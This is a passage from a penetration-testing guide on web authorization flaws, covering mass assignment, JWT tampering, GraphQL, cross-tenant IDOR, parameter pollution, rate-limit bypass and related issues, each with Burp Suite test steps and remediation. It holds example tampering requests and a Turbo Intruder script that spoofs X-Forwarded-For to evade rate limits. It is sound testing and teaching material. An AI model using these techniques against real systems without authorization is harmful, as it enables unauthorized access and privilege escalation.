     "name": "attacker",
     "email": "attacker@example.com",
     "password": "password123",
     "role": "admin",
     "isAdmin": true,
     "account_balance": 999999
   }
   ```

3. **Check Response:**
   - If user is created with admin role or balance updated, mass assignment is possible

4. **Test for Hidden Fields:**
   - Use Param Miner to discover parameters
   - Add common authorization fields: `role`, `is_admin`, `permissions`

**Example **
```php
User::create($request->all());  // Vulnerable to mass assignment
```
vs safe approach:
```php
User::create($request->validated());  // Only validated fields
```

**Tools**
- Burp Param Miner
- Custom scripts

**Risk Rating**  
Critical

**Remediation**
- Never use `$request->all()` with model creation 
- Define `$fillable` or `$guarded` properties in models
- Use form requests with validation rules
- Explicitly map input to model fields

---

## 18. JWT AUTHORIZATION BYPASS (ROLE/PRIVILEGE TAMPERING IN TOKENS)

**Description**  
When using JWT for authorization, the token itself contains role and privilege information. If the JWT is not properly validated, attackers can modify these claims to escalate privileges .

**What to Look For**
- JWT tokens containing role information (e.g., `"role": "user"`)
- No signature validation (can modify token and keep original signature)
- Weak signing keys (can brute force)
- Algorithm confusion vulnerabilities

**What to Ignore**
- Properly validated JWTs with strong signatures

**How to Test with Burp Suite**

1. **Decode JWT:**
   - Use jwt.io or Burp's JWT extension to decode token
   - Examine claims like `role`, `isAdmin`, `permissions`, `groups`

2. **Test Signature Validation:**
   - Modify a claim (e.g., change `"role":"user"` to `"role":"admin"`)
   - Keep original signature
   - Send modified token; if accepted, signature not validated

3. **Test None Algorithm:**
   - Change header to `{"alg":"none"}`
   - Remove signature part
   - Send token; if accepted, vulnerable 

4. **Test Weak Secret:**
   - Use jwt_tool to brute force the secret
   - If secret is weak, can forge arbitrary tokens

5. **Algorithm Confusion:**
   - If server accepts both RS256 and HS256, try using public key as HMAC secret

**Example **
Original JWT payload:
```json
{
  "user": "john",
  "role": "user",
  "iat": 1516239022
}
```
Modified payload:
```json
{
  "user": "john",
  "role": "admin",
  "iat": 1516239022
}
```

**Tools**
- jwt_tool
- Burp extension: JSON Web Tokens
- jwt.io

**Risk Rating**  
Critical

**Remediation**
- Always validate JWT signatures
- Use strong signing keys (>=256 bits) 
- Reject `none` algorithm
- Implement short token expiration
- Consider using reference tokens (opaque) instead of self-contained JWTs

---

## 19. GRAPHQL AUTHORIZATION BYPASS (FIELD-LEVEL ACCESS CONTROL ISSUES)

**Description**  
GraphQL APIs often have complex authorization requirements at the field level. Attackers can request fields they shouldn't have access to, and if authorization is missing at the field level, sensitive data may be exposed .

**What to Look For**
- GraphQL endpoints (`/graphql`, `/graphiql`, `/playground`)
- Introspection enabled (can discover all available fields)
- Different authorization levels for different fields
- Nested queries that access restricted fields through allowed fields

**What to Ignore**
- Properly secured GraphQL with field-level authorization

**How to Test with Burp Suite **

1. **Discover GraphQL Schema:**
   ```
   POST /graphql HTTP/1.1
   Content-Type: application/json

   {"query": "{ __schema { types { name fields { name } } } }"}
   ```

2. **Test Field-Level Access:**
   - Create queries that request fields of varying sensitivity
   ```
   {"query": "{ user(id: 123) { username email passwordHash ssn } }"}
   ```

3. **Test Nested Queries:**
   - Access restricted fields through allowed relationships
   ```
   {"query": "{ me { friends { privateMessages { content } } } }"}
   ```

4. **Test with Different Roles :**
   - Create a test matrix of roles and expected access
   - Automate testing with different tokens

**Example **
```javascript
const tests = [
  {
    name: 'admin can access user passwords',
    query: `{ user(id: 123) { passwordHash } }`,
    role: 'ADMIN',
    expectAccess: true,
  },
  {
    name: 'user cannot access other user passwords',
    query: `{ user(id: 456) { passwordHash } }`,
    role: 'USER',
    expectAccess: false,
  }
];
```

**Tools**
- GraphQL Voyager
- InQL Scanner (Burp extension)
- GraphQL Raider (Burp extension)
- Custom testing frameworks 

**Risk Rating**  
High to Critical

**Remediation**
- Implement field-level authorization in GraphQL resolvers
- Disable introspection in production
- Use query depth limiting and cost analysis
- Regular GraphQL security testing 

---

## 20. MULTI-TENANCY DATA LEAKAGE (CROSS-TENANT ACCESS)

**Description**  
In multi-tenant applications (SaaS platforms), data from different customers (tenants) should be isolated. Attackers may be able to access data from other tenants by manipulating tenant identifiers .

**What to Look For**
- Tenant identifiers in requests: `tenant_id`, `company_id`, `organization_id`
- Subdomain-based tenants: `tenant1.app.com`, `tenant2.app.com`
- Path-based tenants: `app.com/tenant1/`, `app.com/tenant2/`
- No cross-tenant isolation checks

**What to Ignore**
- Properly isolated tenants with robust access controls

**How to Test with Burp Suite**

1. **Identify Tenant Identifiers:**
   - Look for parameters that specify the tenant/company/organization
   - Common names: `tenantId`, `companyId`, `orgId`, `accountId`

2. **Test Tenant Switching:**
   - Log in to Tenant A
   - Change tenant identifier to Tenant B's ID
   - Attempt to access resources

3. **Test Subdomain Switching:**
   - If using subdomains, try accessing other tenants' subdomains directly
   - `https://tenant1.app.com` → `https://tenant2.app.com`

4. **Test Cross-Tenant API Calls:**
   - Capture API requests from Tenant A
   - Modify tenant identifier to Tenant B
   - Replay with Tenant A's session token

**Example **
```http
GET /api/companies/123/employees HTTP/1.1
Cookie: session=USER_FROM_COMPANY_123
```
Change to:
```http
GET /api/companies/456/employees HTTP/1.1
Cookie: session=USER_FROM_COMPANY_123
```
If employees from company 456 are returned, cross-tenant access exists.

**Tools**
- Burp Repeater
- Burp Intruder for tenant ID enumeration

**Risk Rating**  
Critical

**Remediation**
- Always validate that the authenticated user belongs to the requested tenant
- Use tenant context from session, not user input
- Implement database-level tenant isolation
- Regular cross-tenant access testing 

---

## 21. POST → GET METHOD CONVERSION AUTHORIZATION BYPASS

**Description**  
Some applications only check authorization for POST requests but not for GET requests. Attackers can convert POST requests to GET to bypass these checks.

**What to Look For**
- State-changing operations (create, update, delete) that should use POST/PUT/DELETE
- Authorization checks that differ by HTTP method
- GET requests that modify state (should never happen)

**What to Ignore**
- Proper RESTful design with consistent authorization

**How to Test with Burp Suite**

1. **Identify State-Changing POST Requests:**
   - Find requests that modify data (e.g., `/api/deleteUser`, `/api/transfer`)

2. **Convert to GET:**
   - Change POST to GET
   - Move body parameters to URL query string
   ```
   POST /api/deleteUser HTTP/1.1
   Content-Type: application/x-www-form-urlencoded

   userID=123
   ```
   Becomes:
   ```
   GET /api/deleteUser?userID=123 HTTP/1.1
   ```

3. **Send Request and Observe:**
   - If action still executes, authorization is method-dependent

**Example**
```http
POST /api/transfer HTTP/1.1
Cookie: session=USER_SESSION
Content-Type: application/x-www-form-urlencoded

amount=1000&to=123
```
Becomes:
```http
GET /api/transfer?amount=1000&to=123 HTTP/1.1
Cookie: session=USER_SESSION
```
If money is transferred, vulnerable.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
High

**Remediation**
- Implement consistent authorization regardless of HTTP method
- Follow HTTP semantics (GET should never modify state)
- Validate HTTP method on server-side

---

## 22. PARAMETER POLLUTION FOR AUTHORIZATION BYPASS

**Description**  
HTTP parameter pollution involves sending multiple parameters with the same name. Different technologies handle this differently, potentially leading to authorization bypass if the application uses one value for authorization and another for the actual operation .

**What to Look For**
- Parameters that could be duplicated (e.g., `user_id=123&user_id=456`)
- Different components processing different instances of the parameter
- Frameworks that have inconsistent parameter handling

**What to Ignore**
- Consistent parameter handling across all components

**How to Test with Burp Suite**

1. **Identify Target Parameters:**
   - Find parameters that control authorization or identify resources

2. **Test Duplicate Parameters:**
   ```
   GET /api/resource?user_id=123&user_id=456 HTTP/1.1
   ```
   ```
   POST /api/update HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   
   user_id=123&user_id=456&action=view
   ```

3. **Test Array Syntax:**
   - Try `user_id[]=123` and `user_id[]=456`

4. **Observe Behavior:**
   - Which value does the application use?
   - Can you trick it into using a different value for authorization vs. operation?

**Example**
- Front-end load balancer uses first value for routing/auth: `user_id=123`
- Back-end application uses last value for DB query: `user_id=456`
- Attacker can access user 456's data while being authorized as user 123

**Tools**
- Burp Repeater
- Param Miner

**Risk Rating**  
Medium to High

**Remediation**
- Use consistent parameter handling across all components
- Avoid duplicate parameters; reject requests with duplicates
- Validate that all parameters are as expected

---

## 23. HIDDEN PARAMETERS THAT CONTROL AUTHORIZATION

**Description**  
Applications may use hidden parameters (not visible in the UI) to control authorization. Attackers can discover and manipulate these parameters to escalate privileges .

**What to Look For**
- Hidden form fields: `<input type="hidden" name="role" value="user">`
- Parameters in JavaScript or HTML comments
- Parameters discovered via fuzzing
- Debug parameters left in production

**What to Ignore**
- Public parameters that are properly validated

**How to Test with Burp Suite**

1. **Use Param Miner Extension:**
   - Install Param Miner in Burp
   - Right-click requests and select "Guess parameters"
   - Let Param Miner fuzz for hidden parameters

2. **Analyze Client-Side Code:**
   - View page source and JavaScript files
   - Look for hidden form fields or AJAX calls with extra parameters

3. **Common Hidden Parameters to Test:**
   ```
   admin
   isAdmin
   role
   user_type
   permissions
   access_level
   debug
   test
   bypass
   override
   ```

4. **Add Parameters to Requests:**
   - For any request, try adding `&isAdmin=true` or `&role=admin`
   - Observe if behavior changes

**Example**
```http
GET /api/dashboard HTTP/1.1
Cookie: session=USER_SESSION
```
Try:
```http
GET /api/dashboard?isAdmin=true HTTP/1.1
Cookie: session=USER_SESSION
```
If dashboard shows admin content, hidden parameter controls authorization.

**Tools**
- Burp Param Miner
- Custom fuzzing scripts

**Risk Rating**  
High

**Remediation**
- Never use client-side parameters for authorization decisions
- Validate all parameters server-side
- Remove debug/test parameters in production

---

## 24. CACHE-RELATED AUTHORIZATION FLAWS

**Description**  
If sensitive responses are cached by shared caches (CDNs, reverse proxies), authenticated users may inadvertently expose data to unauthorized users who receive cached responses.

**What to Look For**
- `Cache-Control` headers that allow caching of sensitive responses
- Responses containing user-specific data without proper cache directives
- Publicly accessible URLs that return private data
- CDN or proxy caching enabled

**What to Ignore**
- Properly configured cache headers for sensitive content

**How to Test with Burp Suite**

1. **Check Cache Headers:**
   - Look for responses missing:
   ```
   Cache-Control: no-store, no-cache, must-revalidate, private
   ```

2. **Test for Cacheability:**
   - Access sensitive URL as User A
   - Log out and clear browser cache
   - Access same URL as anonymous user
   - If data appears, it may have been cached

3. **Test with Different Users:**
   - Access URL as User A
   - Access same URL as User B
   - Check if User B sees User A's data (possible if cache key doesn't include user context)

**Example**
```http
GET /api/user/profile HTTP/1.1
Response:
Cache-Control: public, max-age=3600
```
This response could be cached and served to other users.

**Tools**
- Burp Proxy (examine cache headers)
- Browser DevTools (cache inspection)

**Risk Rating**  
Medium

**Remediation**
- Set appropriate cache headers for all responses
- For sensitive data, use:
  ```
  Cache-Control: no-store, must-revalidate
  Pragma: no-cache
  Expires: 0
  ```
- Include user context in cache keys if caching is necessary

---

## 25. SESSION BASED AUTHORIZATION FLAWS (PRIVILEGE ESCALATION VIA SESSION REUSE)

**Description**  
When a user's privileges change (e.g., from regular user to admin), sessions should be regenerated. If not, an attacker with a stolen session could maintain access even after privilege changes.

**What to Look For**
- Session token remains same after privilege escalation
- No session regeneration when admin privileges granted
- Ability to use old session token after privilege change

**What to Ignore**
- Session token changes after any privilege change

**How to Test with Burp Suite**

1. **Capture Pre-Privilege Session:**
   - Log in as regular user, note session cookie
   - Perform actions that should escalate privileges (e.g., admin approval)

2. **Test After Privilege Change:**
   - After becoming admin, check if session cookie changed
   - If same, try using the old session token from another browser

3. **Test Session Invalidation:**
   - Have admin revoke your privileges
   - Check if your session still works

**Example**
- User logs in with session token `abc123`
- User becomes admin via promotion
- Session token remains `abc123`
- Attacker who stole `abc123` before promotion now has admin access

**Tools**
- Burp Proxy
- Multiple browsers

**Risk Rating**  
High

**Remediation**
- Regenerate session ID after any privilege change
- Invalidate old sessions on the server
- Implement session binding to user attributes

---

## 26. INSECURE DIRECT OBJECT REFERENCE IN WEBSOCKET MESSAGES

**Description**  
Modern applications often use WebSockets for real-time communication. IDOR vulnerabilities can also exist in WebSocket messages, where users can subscribe to or send messages for other users' resources.

**What to Look For**
- WebSocket connections used for real-time updates
- Message formats containing object IDs (user IDs, chat room IDs, document IDs)
- No authorization checks on WebSocket messages

**What to Ignore**
- Properly authorized WebSocket connections and messages

**How to Test with Burp Suite**

1. **Capture WebSocket Messages:**
   - Use Burp to intercept WebSocket traffic
   - Look for messages containing IDs or resource references

2. **Modify WebSocket Messages:**
   - In Burp's WebSocket history, right-click and send to Repeater
   - Modify IDs in messages
   - Forward modified messages

3. **Test Subscription Patterns:**
   - If using topics/channels (e.g., `user/123/updates`), try subscribing to other users' channels
   ```
   {"subscribe": "user/124/updates"}
   ```

**Example**
WebSocket message:
```json
{
  "action": "getMessage",
  "chatId": "12345"
}
```
Change to:
```json
{
  "action": "getMessage",
  "chatId": "12346"
}
```
If other user's messages are returned, IDOR exists.

**Tools**
- Burp Suite (WebSocket support)
- WSSocket tools
- Custom WebSocket clients

**Risk Rating**  
High

**Remediation**
- Implement authorization checks for every WebSocket message
- Authenticate WebSocket connections properly
- Validate that user has access to requested resources on each message

---

## 27. IDOR IN API VERSIONING (V1 VS V2 AUTHORIZATION DIFFERENCES)

**Description**  
When APIs have multiple versions, authorization checks may be implemented inconsistently. Older versions (v1) might lack proper authorization while newer versions (v2) are secure.

**What to Look For**
- Multiple API versions: `/api/v1/`, `/api/v2/`, `/api/latest/`
- Different authentication/authorization mechanisms across versions
- Deprecated endpoints that are still accessible

**What to Ignore**
- Consistent authorization across all API versions

**How to Test with Burp Suite**

1. **Discover API Versions:**
   - Try common version paths: `/api/v1`, `/api/v2`, `/api/v3`
   - Check API documentation or JavaScript for version references

2. **Compare Authorization:**
   - Test same functionality across different versions
   - Example: `/api/v1/admin/users` vs `/api/v2/admin/users`
   - One may be protected while the other is not

3. **Test Deprecated Endpoints:**
   - Old endpoints may have been forgotten and lack authorization
   - Try accessing functionality through older API versions

**Example**
```http
GET /api/v2/users/123 HTTP/1.1  → 403 Forbidden
GET /api/v1/users/123 HTTP/1.1  → 200 OK with user data
```

**Tools**
- Burp Intruder for version brute force
- Custom scripts

**Risk Rating**  
High

**Remediation**
- Apply consistent authorization across all API versions
- Deprecate and remove old API versions properly
- Regularly audit all API endpoints, including legacy ones

---

## 28. RATE LIMIT BYPASS FOR AUTHORIZATION BRUTE FORCE

**Description**  
When testing authorization, you may need to enumerate IDs or test many combinations. Rate limiting can prevent this, but may be bypassable.

**What to Look For**
- IP-based rate limiting (bypass with IP rotation)
- User-based rate limiting (bypass with multiple accounts)
- Rate limiting that resets (wait and continue)
- Missing rate limiting on sensitive endpoints

**What to Ignore**
- Properly implemented rate limiting that can't be bypassed

**How to Test with Burp Suite**

1. **Test Rate Limit Threshold:**
   - Send increasing number of requests
   - Determine when rate limiting kicks in

2. **Bypass Techniques:**
   - Use different IPs via `X-Forwarded-For` header
   - Rotate user agents
   - Use multiple sessions/accounts
   - Add random delays between requests

3. **Turbo Intruder for Race Conditions:**
   - Use Turbo Intruder to send requests quickly before rate limit is applied

**Example**
```python
# Turbo Intruder script to bypass rate limits
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False)
    
    for i in range(1000):
        engine.queue(target.req, [
            'X-Forwarded-For: 192.168.1.' + str(i)
        ])
```

**Tools**
- Burp Turbo Intruder
- Custom Python scripts with proxy rotation

**Risk Rating**  
Medium

**Remediation**
- Implement robust rate limiting that can't be easily bypassed
- Use CAPTCHA after certain thresholds
- Monitor for enumeration patterns
- Consider using account lockouts for ID enumeration attempts

---

## 29. TIME-BASED AUTHORIZATION FLAWS (TOKEN/PRIVILEGE NOT EXPIRING)

**Description**  
Some authorization tokens or privileges may not expire, allowing long-term access even after they should be revoked (e.g., after password change, after leave of absence).

**What to Look For**
- Tokens with no expiration (`exp` claim missing in JWT)
- Privileges that persist after role changes
- "Remember me" tokens that never expire
- Sessions that remain valid indefinitely

**What to Ignore**
- Properly expiring tokens with reasonable lifetimes

**How to Test with Burp Suite**

1. **Check Token Expiration:**
   - Examine JWT tokens for `exp` claim
   - If missing, token may never expire

2. **Test Long-Term Access:**
   - Obtain a session token
   - Wait for expected expiration period (check application policy)
   - Replay the token after the period

3. **Test After Privilege Changes:**
   - Get token as User A with role X
   - Have role changed to Y (or revoked)
   - Test if old token still works

**Example**
JWT without expiration:
```json
{
  "user": "admin",
  "role": "administrator"
}
```
No expiration means this token could be valid forever.

**Tools**
- Burp Repeater for replay testing
- jwt.io for token inspection

**Risk Rating**  
High

**Remediation**
- Always include expiration claims in tokens
- Set reasonable expiration times (minutes/hours, not days)
- Implement refresh token rotation
- Invalidate tokens on privilege changes

---

## 30. BUSINESS LOGIC AUTHORIZATION BYPASS (FUNCTION CHAINING)

**Description**  
Complex business logic may have authorization flaws when multiple functions are chained together. A user might not have direct access to a sensitive function, but can reach it indirectly through a chain of authorized functions.

**What to Look For**
- Complex workflows with multiple steps
- Functions that can be combined to achieve unintended results
- Race conditions in multi-step processes
- Authorization checked only at entry points, not throughout

**What to Ignore**
- Properly validated workflows with consistent authorization

**How to Test with Burp Suite**

1. **Map Complex Workflows:**
   - Document all steps in business processes
   - Note which steps are authorized for which roles

2. **Identify Authorization Gaps:**
   - Look for steps that may have weaker authorization
   - Find sequences where each step individually is allowed, but the combination leads to privilege escalation

3. **Test Function Chaining:**
   - Step 1: Call function A (allowed for user)
   - Step 2: Call function B (allowed for user)
   - Step 3: Result = admin function accessed through chain

4. **Example Scenario:**
   - User cannot directly delete other users
   - User can modify their own profile
   - User can submit support tickets
   - If support ticket system allows requesting user deletion, chain leads to authorization bypass

**Example**
```http
# Step 1: User modifies profile to include admin flag
POST /api/profile/update
{"isAdmin": true}

# Step 2: Profile update is rejected (properly)
# But user submits support ticket:
POST /api/support/ticket
{"subject": "Please delete user 456", "priority": "high"}

# Step 3: Support system processes ticket with user's elevated privileges
# User 456 is deleted
```

**Tools**
- Burp Proxy for workflow recording
- Manual scenario testing
- Custom scripts

**Risk Rating**  
High

**Remediation**
- Implement authorization checks at every step of business processes
- Don't assume that authorization at entry points is sufficient
- Review complex workflows for unintended combinations
- Regular business logic testing

---

## ✅ **SUMMARY**

Authorization testing is the most critical part of web application security testing. Broken access control consistently ranks as the #1 most critical web application security risk in the OWASP Top 10.

### **Key Testing Areas Summary **

| Attack Type | What to Test | Risk Level |
|-------------|--------------|------------|
| Horizontal Bypass (IDOR) | Access other users' data of same privilege level | Critical |
| Vertical Bypass | Access higher privilege functions (user → admin) | Critical |
| Missing Function Level Controls | Direct access to admin APIs/functions | Critical |
| Parameter Tampering | Role, isAdmin, permissions parameters | High |
| Forced Browsing | Hidden directories and endpoints | High |
| HTTP Method Tampering | Different methods for same endpoint | Medium-High |
| Header-Based Bypass | X-Original-URL, X-Forwarded-For | Medium-High |
| CORS Misconfiguration | Cross-origin data theft | High |
| Mass Assignment | Extra parameters in requests | Critical |
| JWT Tampering | Modify role claims in tokens | Critical |
| GraphQL Field Access | Field-level authorization gaps | High |
| Multi-Tenancy | Cross-tenant data access | Critical |

### **Pro Tips for Authorization Testing**

1. **Use Autorize Extension**: Automatically tests for authorization bypass by replaying requests with different session cookies 

2. **Create Test Matrix**: Map all roles, functions, and expected access levels 

3. **Test Both Positive and Negative Cases**: Verify that users CAN access their own data and CANNOT access others' data 

4. **Automate in CI/CD**: Integrate authorization testing into pipelines to catch regressions 

5. **Focus on APIs**: Modern applications often have rich APIs that are more vulnerable than web interfaces

### **Remediation Best Practices **

- Employ the principle of least privilege
- Implement consistent access controls across all application layers
- Deny by default; allow by exception
- Use centralized authorization mechanisms
- Regular security testing and code reviews

---

*This guide is for professional security testing purposes only. Unauthorized testing is illegal.*
